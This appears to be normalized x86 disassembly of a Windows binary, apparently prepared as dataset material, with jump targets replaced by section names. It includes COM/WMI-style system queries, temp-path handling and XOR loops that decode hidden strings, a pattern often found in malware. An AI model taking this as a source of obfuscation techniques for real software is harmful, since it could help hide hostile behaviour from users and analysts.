mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
test ebx ebx
je r-xdata
test esi esi
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
test [ ebp + 0x10 ] 0x4
jne r-xdata
pop esi
mov eax 0x2
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
push ecx
push eax
mov ecx edi
call sub_1001c160
add esp 0x8
test eax eax
je r-xdata
pop esi
mov eax 0x3
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov ecx [ rw-data ]
push 0x104
lea eax [ ebp - 0x20c ]
push eax
push ecx
call [ GetModuleFileNameW@IAT ]
test eax eax
jne r-xdata
pop esi
mov eax 0x4
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x20c ]
push edx
call [ PathRemoveFileSpecW@IAT ]
lea eax [ ebp - 0x20c ]
push eax
call [ PathAddBackslashW@IAT ]
mov ecx [ rw-data ]
cmp [ ecx + 0xd54 ] 0x0
mov [ ebp - 0x418 ] esi
jne r-xdata
pop esi
mov eax 0x5
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x414 ]
lea esi [ ebp - 0x20c ]
mov ecx eax
xor ebx ebx
mov edx 0x104
sub esi ecx
lea esp [ esp ]
mov [ ebp - 0x418 ] ebx
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
xor edx edx
mov [ eax ] dx
test ebx ebx
je r-xdata
sub eax 0x2
mov ebx 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
mov eax [ ebp - 0x418 ]
push eax
mov esi 0x104
lea ebx [ ebp - 0x414 ]
call sub_1004e6c0
test eax eax
je r-xdata
pop esi
lea eax [ edx + 0x6 ]
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea ecx [ edx + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp - 0x41c ]
lea edx [ ebp - 0x414 ]
push edx
mov edx edi
call sub_10002b60
add esp 0x8
neg eax
sbb eax eax
pop esi
and eax 0x8
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
pop esi
mov eax 0x7
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_1001699d
push 0x14
mov eax sub_100854e5
call sub_100624bc
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10034e98
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_100389e0
mov ecx [ ebp + 0x8 ]
push eax
call sub_100014d0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10069747
mov eax edi
call sub_10013ab8
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1002c612
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10029420
push edi
call sub_10062b65
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1002c57b
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10024fe9
sub_10016a40
push esi
mov esi ecx
mov eax [ esi ]
mov edx [ eax + 0x18 ]
call edx
mov ecx 0xffff
cmp cx ax
jne r-xdata
mov eax [ esi + 0x30 ]
dec [ eax ]
mov esi [ esi + 0x20 ]
mov eax [ esi ]
lea edx [ eax + 0x2 ]
mov [ esi ] edx
movzx eax [ eax ]
pop esi
retn
mov eax ecx
pop esi
retn
sub_10016a70
push ebp
mov ebp esp
push 0xffffffff
push sub_100864b1
mov eax [ fs : 0x0 ]
push eax
sub esp 0xf0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
cmp [ ecx + 0x8 ] 0x6
mov eax [ ebp + 0x8 ]
mov esi edx
mov [ ebp - 0xe8 ] eax
jne r-xdata
lea edx [ ebp - 0x40 ]
mov eax 0x20
call sub_10049e00
lea eax [ ebp - 0xc4 ]
lea edi [ ebp - 0x40 ]
mov ecx eax
mov edx 0x32
sub edi ecx
lea ecx [ ecx ]
lea edx [ ebp - 0x40 ]
xor eax eax
call sub_10049e00
lea eax [ ebp - 0xc4 ]
lea edi [ ebp - 0x40 ]
mov ecx eax
mov edx 0x32
sub edi ecx
jmp r-xdata
test edx edx
jne r-xdata
movzx ecx [ edi + eax ]
test cx cx
je r-xdata
lea ecx [ edx + 0x7fffffcc ]
test ecx ecx
je r-xdata
xor edx edx
push edx
push edx
mov [ eax ] dx
call [ CoInitializeEx@IAT ]
test eax eax
je r-xdata
sub eax 0x2
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
movzx ecx [ edi + eax ]
test cx cx
je r-xdata
lea eax [ ebp - 0xc8 ]
push eax
push r--data
push 0x1
push 0x0
push r--data
call [ CoCreateInstance@IAT ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
lea ecx [ edx + 0x7fffffcc ]
test ecx ecx
je r-xdata
jmp r-xdata
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea ecx [ ebp - 0xec ]
push ecx
lea edi [ ebp - 0xc4 ]
call sub_1006f670
mov [ ebp - 0x4 ] 0x0
mov eax [ eax ]
test eax eax
je r-xdata
call [ CoUninitialize@IAT ]
mov eax 0x3
jmp r-xdata
mov eax 0x2
jmp r-xdata
jmp r-xdata
xor ecx ecx
mov ecx [ eax ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
test ebx ebx
je r-xdata
mov edi eax
add eax 0x8
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0xc8 ]
mov edx [ eax ]
lea edi [ ebp - 0xcc ]
push edi
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ecx
push eax
mov eax [ edx + 0xc ]
call eax
mov ebx eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0xec ]
test eax eax
je r-xdata
mov eax [ ebp - 0xcc ]
push 0x0
push 0x0
push 0x3
push 0x3
push 0x0
push 0x0
push 0xa
push eax
call [ CoSetProxyBlanket@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0xc8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call [ CoUninitialize@IAT ]
mov eax 0x4
jmp r-xdata
test edi edi
je r-xdata
lea edi [ ebp - 0xe4 ]
mov eax 0x23
call sub_1004e680
lea eax [ ebp - 0xe0 ]
push eax
mov edi esi
call sub_1006f670
mov edi eax
lea ecx [ ebp - 0xe4 ]
push ecx
lea ebx [ ebp - 0xd8 ]
mov [ ebp - 0x4 ] 0x1
call sub_10022ee0
mov [ ebp - 0x4 ] 0x2
mov ecx [ edi ]
test ecx ecx
je r-xdata
mov eax [ ebp - 0xcc ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0xc8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call [ CoUninitialize@IAT ]
mov eax 0x5
jmp r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
xor ecx ecx
mov ecx [ ecx ]
jmp r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
push eax
call [ SysFreeString@IAT ]
xor edx edx
mov edx [ eax ]
jmp r-xdata
mov eax [ eax ]
test eax eax
je r-xdata
push edi
call sub_100187af
add esp 0x4
push eax
call sub_10034c90
add esp 0x4
lea edx [ ebp - 0x58 ]
mov eax 0x1f
call sub_10049e00
mov eax [ ebp - 0xd0 ]
test eax eax
je r-xdata
mov eax [ ebp - 0xcc ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0xc8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call [ CoUninitialize@IAT ]
mov eax 0x6
jmp r-xdata
mov eax [ ebp - 0xcc ]
mov esi [ eax ]
lea edi [ ebp - 0xd0 ]
push edi
push 0x0
push 0x30
push ecx
push edx
mov edx [ esi + 0x50 ]
push eax
call edx
lea edi [ ebp - 0xd8 ]
mov ebx eax
call sub_1004d6c0
lea edi [ ebp - 0xe0 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_1004d6c0
test ebx ebx
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0xcc ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0xc8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call [ CoUninitialize@IAT ]
xor eax eax
mov ebx [ VariantClear@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0xd4 ]
mov ecx [ eax ]
push 0x0
push 0x0
lea edx [ ebp - 0xfc ]
push edx
push 0x0
lea edx [ ebp - 0x58 ]
push edx
push eax
mov eax [ ecx + 0x10 ]
call eax
mov eax [ ebp - 0xe8 ]
mov edi [ ebp - 0xf4 ]
mov edx 0x104
sub edi eax
lea esp [ esp ]
test edx edx
jne r-xdata
movzx ecx [ edi + eax ]
test cx cx
je r-xdata
xor edx edx
mov [ eax ] dx
lea eax [ ebp - 0xfc ]
push eax
call ebx
mov eax [ ebp - 0xd4 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0xd0 ]
test eax eax
jne r-xdata
sub eax 0x2
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
mov ecx [ eax ]
lea edx [ ebp - 0xdc ]
push edx
lea edx [ ebp - 0xd4 ]
push edx
push 0x1
push 0xffffffff
push eax
mov eax [ ecx + 0x10 ]
call eax
cmp [ ebp - 0xdc ] 0x0
mov eax [ ebp - 0xd0 ]
je r-xdata
lea ecx [ edx + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
sub_10016e7c
push 0x34
mov eax sub_100852df
call sub_1003fae8
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x14 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x40 ] eax
mov al [ ebx ]
test al al
je r-xdata
xor esi esi
push esi
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x2c ] 0x0
call sub_100405c0
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x3c ] 0xfffffffe
mov [ ebp - 0x34 ] 0x1
mov cl al
mov edx ebx
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1002c8c0
mov eax [ ebp - 0x3c ]
call sub_1004642f
retn
mov al [ edi + ebx ]
test al al
je r-xdata
inc edx
mov cl [ edx ]
test cl cl
jne r-xdata
inc [ ebp + 0x10 ]
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov cl [ ebx ]
cmp cl al
jne r-xdata
cmp [ eax + esi ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
inc edi
mov al [ edi + ebx ]
test al al
jne r-xdata
add edi [ ebp - 0x34 ]
mov al [ edi + ebx ]
cmp al [ ebx ]
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp al cl
je r-xdata
push 0x7f
pop ecx
cmp [ ebp - 0x34 ] ecx
jae r-xdata
test al al
je r-xdata
movsx eax [ eax + esi ]
add edi eax
jmp r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov ecx [ ebp - 0x34 ]
push [ ebp - 0x40 ]
mov ecx [ ebp - 0x38 ]
call sub_10069d0f
test al al
jne r-xdata
inc esi
cmp esi [ ebp + 0x10 ]
jb r-xdata
mov [ ebp - 0x3c ] esi
lea eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x34 ]
cmp ecx 0x7f
jb r-xdata
mov ecx [ ebp - 0x38 ]
cmp [ ecx + 0x4 ] al
jne r-xdata
cmp [ ebp - 0x2d ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
push 0x7f
pop ecx
movzx eax [ ecx + 0x6 ]
movsx ecx [ edi + ebx ]
cmp ecx eax
jne r-xdata
call sub_1001c121
mov ecx [ ebp - 0x38 ]
push [ ebp - 0x40 ]
mov ecx [ ebp - 0x38 ]
call sub_10069d0f
test al al
jne r-xdata
mov [ eax + esi ] cl
lea eax [ ebp - 0x2c ]
jmp r-xdata
mov [ ebp - 0x2d ] 0x1
jmp r-xdata
mov ecx [ ebp - 0x38 ]
inc [ ebp - 0x34 ]
call sub_1005a5dc
or [ ebp - 0x3c ] 0xffffffff
jmp r-xdata
xor esi esi
xor edi edi
mov [ ebp - 0x2d ] 0x0
cmp [ ebp + 0x10 ] esi
jbe r-xdata
sub_10016ff0
push ebp
mov ebp esp
push 0xffffffff
push sub_1008620b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x44
call sub_1001f84c
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x18
mov ecx [ ebp + 0x1c ]
mov edx [ ebp + 0x18 ]
push ecx
mov ecx [ ebp + 0x10 ]
push edx
mov edx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x14 ]
push edx
mov edx [ ebp + 0x8 ]
push eax
call sub_1004c680
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x18
sub_10017080
push ebp
mov ebp esp
push 0xffffffff
push sub_1008a13c
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2c8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov edi ecx
lea ecx [ edi + 0x3b0 ]
mov [ ebp - 0x2d0 ] edi
mov [ ebp - 0x2cc ] eax
call sub_10039630
lea eax [ ebp - 0x284 ]
push eax
push 0x104
call [ GetTempPathA@IAT ]
lea eax [ ebp - 0x17c ]
lea edx [ ebp - 0x284 ]
mov ecx eax
xor esi esi
mov ebx 0x104
sub edx ecx
test ebx ebx
jne r-xdata
mov cl [ edx + eax ]
test cl cl
je r-xdata
mov [ eax ] 0x0
test esi esi
jns r-xdata
dec eax
mov esi 0x8007007a
mov [ eax ] cl
inc eax
dec ebx
jne r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov eax 0x1
jmp r-xdata
lea ecx [ ebx + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
mov dl [ eax + esi ]
xor dl cl
xor dl 0xe1
inc cl
mov [ ebp + eax - 0x2bc ] dl
movzx eax cl
cmp eax 0x13
jb r-xdata
mov [ ebp - 0x2a9 ] 0x0
mov eax 0x104
lea ecx [ ebp - 0x17c ]
lea esp [ esp ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
xor esi esi
cmp eax esi
je r-xdata
inc ecx
dec eax
jne r-xdata
mov eax 0x2
jmp r-xdata
mov ecx 0x104
sub ecx eax
lea eax [ ebp - 0x2bc ]
push eax
mov eax 0x104
sub eax ecx
lea ecx [ ebp + ecx - 0x17c ]
mov edx 0x7fffffff
call sub_10072720
cmp eax esi
jge r-xdata
cmp [ ecx ] 0x0
je r-xdata
mov eax 0x2
jmp r-xdata
push 0x3039
lea ecx [ ebp - 0x17c ]
push ecx
mov ecx edi
mov [ ebp - 0x2c8 ] esi
call sub_1000a150
test eax eax
jne r-xdata
mov eax [ ebp - 0x2cc ]
mov ebx [ eax ]
mov eax [ eax + 0x4 ]
cmp ebx eax
je r-xdata
lea edx [ ebp - 0x74 ]
mov eax 0x105
call sub_10045930
xor edx edx
lea eax [ ebp - 0x74 ]
mov [ ebp - 0x2a0 ] dx
mov [ ebp - 0x28c ] 0x7
mov [ ebp - 0x290 ] esi
lea edx [ eax + 0x2 ]
lea ebx [ ebx ]
mov ecx edi
call sub_1005fd90
test eax eax
jne r-xdata
mov edx [ ebx + 0x14 ]
cmp edx 0x8
jb r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea eax [ ebp - 0x74 ]
push eax
lea ecx [ ebp - 0x2a0 ]
call sub_1005ddc0
lea edx [ ebp - 0x2a0 ]
mov ecx 0x6
mov [ ebp - 0x4 ] esi
call sub_100205a0
cmp [ ebp - 0x28c ] 0x8
jb r-xdata
mov eax [ edi + 0x3a0 ]
push 0x2
push esi
push esi
mov esi [ eax ]
add esi 0x20
call sub_10031140
mov ecx [ edi + 0x3a0 ]
mov eax [ ecx ]
mov edx [ eax + 0x20 ]
mov ecx [ edx + 0x4 ]
test [ eax + ecx + 0x2c ] 0x6
jne r-xdata
lea edx [ ebp - 0x6c ]
mov eax 0x66
call sub_10045930
xor eax eax
mov [ ebp - 0x2a0 ] ax
mov eax edx
mov [ ebp - 0x28c ] 0x7
mov [ ebp - 0x290 ] esi
lea edx [ eax + 0x2 ]
mov eax ebx
mov eax [ ebx ]
jmp r-xdata
mov eax 0x3
jmp r-xdata
mov ecx [ ebp - 0x2a0 ]
push ecx
call sub_100187af
add esp 0x4
mov eax [ r--data ]
mov ecx [ r--data ]
mov [ ebp - 0x2c4 ] eax
xor eax eax
mov [ ebp - 0x2c0 ] ecx
mov [ ebp - 0x2bc ] eax
mov [ ebp - 0x2b8 ] eax
mov [ ebp - 0x2b4 ] eax
mov eax [ eax + ecx + 0x58 ]
mov edx [ eax ]
mov edx [ edx + 0x28 ]
push 0x1
push 0x1
push 0x0
push 0x0
lea ecx [ ebp - 0x2c4 ]
push ecx
mov ecx eax
call edx
jmp r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea ecx [ ebp - 0x6c ]
push ecx
lea ecx [ ebp - 0x2a0 ]
call sub_1005ddc0
lea edx [ ebp - 0x2a0 ]
mov ecx 0x6
mov [ ebp - 0x4 ] 0x3
call sub_100205a0
cmp [ ebp - 0x28c ] 0x8
jb r-xdata
mov eax ebx
mov eax [ ebx ]
jmp r-xdata
mov ecx [ ebx + 0x10 ]
lea ecx [ eax + ecx * 2 ]
cmp edx 0x8
jb r-xdata
mov edx [ ebp - 0x2c4 ]
add edx [ ebp - 0x2bc ]
mov ecx [ edi + 0x3a0 ]
push 0x0
mov [ edi + 0x8 ] edx
mov esi [ ecx ]
push 0x0
push 0x0
add esi 0x20
call sub_10031140
mov edx [ edi + 0x8 ]
push edx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov ecx eax
mov eax [ edi + 0x8 ]
cdq
push edx
push eax
mov eax [ edi + 0x3a0 ]
push ecx
mov [ edi + 0x4 ] ecx
mov ecx [ eax ]
add ecx 0x20
push ecx
call sub_10050ad0
mov eax [ ebp - 0x2c8 ]
mov eax 0x8
jmp r-xdata
mov edx [ ebp - 0x2a0 ]
push edx
call sub_100187af
add esp 0x4
mov esi [ ebp - 0x2d0 ]
call sub_10013260
test eax eax
jne r-xdata
lea edi [ ebp - 0x2a0 ]
mov edx [ ebp - 0x2c8 ]
push edx
push ecx
push eax
lea eax [ ebp - 0x2a0 ]
push eax
mov [ ebp - 0x28c ] 0xf
mov [ ebp - 0x290 ] esi
mov [ ebp - 0x2a0 ] 0x0
call sub_10055260
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x28c ] 0x10
mov edi [ ebp - 0x2a0 ]
jae r-xdata
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x28c ] 0x10
jb r-xdata
lea edx [ ebp - 0x58 ]
mov eax 0x45
call sub_10045930
mov ecx edx
push ecx
lea edx [ ebp - 0x2c4 ]
push edx
call sub_10017cc0
add esp 0x8
mov edx eax
mov ecx 0x6
mov [ ebp - 0x4 ] 0x2
call sub_100205a0
cmp [ ebp - 0x2b0 ] 0x8
jb r-xdata
mov edx [ ebp - 0x2cc ]
add ebx 0x24
xor esi esi
cmp ebx [ edx + 0x4 ]
jne r-xdata
mov ecx [ ebp - 0x2a0 ]
push ecx
call sub_100187af
add esp 0x4
mov [ ebp - 0x2c8 ] 0x2
mov eax [ ebp - 0x2c4 ]
push eax
call sub_100187af
add esp 0x4
mov edi [ ebp - 0x2d0 ]
sub_100174f0
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x18 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x18 ] ecx
mov ecx [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x20 ]
mov [ esi ] ecx
mov ecx [ ebp + 0x10 ]
mov [ edi ] edx
xor edx edx
mov [ ebp - 0x14 ] eax
mov eax [ esi ]
cmp eax ecx
setne dl
mov [ ebp - 0x10 ] edx
cmp eax ecx
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x10 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x1c
mov eax [ ebp + 0x1c ]
cmp [ edi ] eax
je r-xdata
mov ebx [ edi ]
call sub_10036f20
mov ecx [ ebp + 0x1c ]
mov edx [ ebp - 0x18 ]
sub ecx ebx
add edx 0x8
cmp eax ecx
mov eax [ ebp - 0x14 ]
push edx
push eax
jg r-xdata
mov ecx [ eax ]
mov eax [ esi ]
mov [ ebp - 0x1c ] ecx
movzx ecx [ eax ]
push ecx
lea edx [ ebp - 0xc ]
push edx
call sub_10026e29
mov ebx eax
add esp 0x10
test ebx ebx
js r-xdata
mov ecx [ esi ]
movzx edx [ ecx ]
push edx
push ebx
call sub_10026e29
add esp 0x10
test eax eax
js r-xdata
pop edi
pop esi
mov eax 0x2
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x1c
mov eax [ edi ]
mov ecx [ ebp + 0x1c ]
sub ecx eax
cmp ecx ebx
jl r-xdata
add [ esi ] 0x2
add [ edi ] eax
jmp r-xdata
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x14 ]
mov [ edx ] ecx
push ebx
lea edx [ ebp - 0xc ]
push edx
push eax
call sub_1007f5d0
add [ esi ] 0x2
add esp 0xc
add [ edi ] ebx
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x0
cmp [ esi ] eax
jne r-xdata
jmp r-xdata
sub_10017600
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
cmp esi ebx
je r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_1005e29f
mov [ esi ] al
inc esi
add esp 0x8
cmp esi ebx
jne r-xdata
pop edi
sub_10017640
push ebp
mov ebp esp
sub esp 0x6c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
push esi
xor eax eax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffa4
and edx 0xff
mov [ ebp + eax * 2 - 0x1c ] dx
inc eax
cmp eax 0xb
jb r-xdata
xor eax eax
lea edx [ ebp - 0x68 ]
push edx
mov [ ebp - 0x6 ] ax
mov [ ebp - 0x68 ] eax
mov eax [ edi + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x1c ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
jne r-xdata
lea edx [ ebp - 0x60 ]
mov eax 0x83
call sub_10053240
mov esi [ ebp - 0x68 ]
call sub_10045bd0
mov esi eax
mov eax [ ebp - 0x68 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
test esi esi
je r-xdata
mov esi [ edi + 0x12c ]
test esi esi
je r-xdata
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov eax [ edi + 0x1c ]
lea edx [ ebp - 0x64 ]
push edx
lea edx [ ebp - 0x1c ]
mov [ ebp - 0x64 ] 0x0
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
mov eax [ ebp - 0x64 ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
pop esi
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov edx [ esi ]
lea ecx [ ebp - 0x64 ]
push ecx
mov ecx edi
call sub_10058130
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
sub_10017735
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
push ebx
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x24 ]
xor edi edi
call sub_1001da0a
mov eax [ ebp - 0x24 ]
mov esi [ eax + 0xd4 ]
mov [ ebp - 0x4 ] edi
mov ebx [ ebp - 0x4 ]
push [ esi + ebx * 4 + 0x1c ]
call sub_1007fa90
push [ esi + ebx * 4 ]
mov [ ebp - 0x14 ] eax
call sub_1007fa90
add eax edi
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x7
pop ecx
pop ecx
mov ecx [ ebp - 0x14 ]
lea edi [ eax + ecx + 0x2 ]
jb r-xdata
lea eax [ esi + 0x38 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] 0xc
mov ebx [ ebp - 0x10 ]
push [ ebx + 0x30 ]
call sub_1007fa90
push [ ebx ]
mov [ ebp - 0xc ] eax
call sub_1007fa90
add [ ebp - 0x10 ] 0x4
pop ecx
pop ecx
mov ecx [ ebp - 0xc ]
add eax edi
dec [ ebp - 0x14 ]
lea edi [ eax + ecx + 0x2 ]
jne r-xdata
push [ esi + 0x9c ]
call sub_1007fa90
push [ esi + 0x98 ]
mov ebx eax
call sub_1007fa90
push [ esi + 0xa0 ]
add eax edi
lea edi [ eax + ebx + 0x2 ]
call sub_1007fa90
push [ esi + 0xa4 ]
lea edi [ edi + eax + 0x1 ]
call sub_1007fa90
push [ esi + 0xa8 ]
lea edi [ edi + eax + 0x1 ]
call sub_1007fa90
lea eax [ edi + eax + 0x165 ]
push eax
mov [ ebp - 0x8 ] eax
call sub_1002fb6b
mov ebx eax
add esp 0x18
test ebx ebx
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x164
push esi
push ebx
lea edi [ ebx + 0x164 ]
call sub_1007f5d0
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x1c ]
mov [ ebp - 0x10 ] ebx
add esp 0xc
sub [ ebp - 0x10 ] esi
mov [ ebp - 0xc ] eax
pop edi
pop esi
mov eax ebx
pop ebx
leave
retn
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1003cbb0
push edi
call sub_1007fa90
mov ecx [ ebp - 0x10 ]
lea edi [ edi + eax + 0x1 ]
mov eax [ ebp - 0xc ]
mov [ ecx + eax ] edi
push [ eax ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
push eax
push edi
call sub_10057f0f
add esp 0x10
test eax eax
jne r-xdata
push edi
call sub_1007fa90
lea edi [ edi + eax + 0x1 ]
mov eax [ ebp - 0x14 ]
mov [ eax ] edi
mov eax [ ebp - 0xc ]
push [ eax + 0x30 ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
push eax
push edi
call sub_10057f0f
add esp 0x10
test eax eax
jne r-xdata
push edi
call sub_1007fa90
inc [ ebp - 0x4 ]
add [ ebp - 0xc ] 0x4
cmp [ ebp - 0x4 ] 0x7
pop ecx
lea edi [ edi + eax + 0x1 ]
jb r-xdata
push edi
call sub_1007fa90
inc [ ebp - 0x4 ]
add [ ebp - 0xc ] 0x4
add [ ebp - 0x14 ] 0x4
cmp [ ebp - 0x4 ] 0xc
pop ecx
lea edi [ edi + eax + 0x1 ]
jb r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx + eax * 4 ] edi
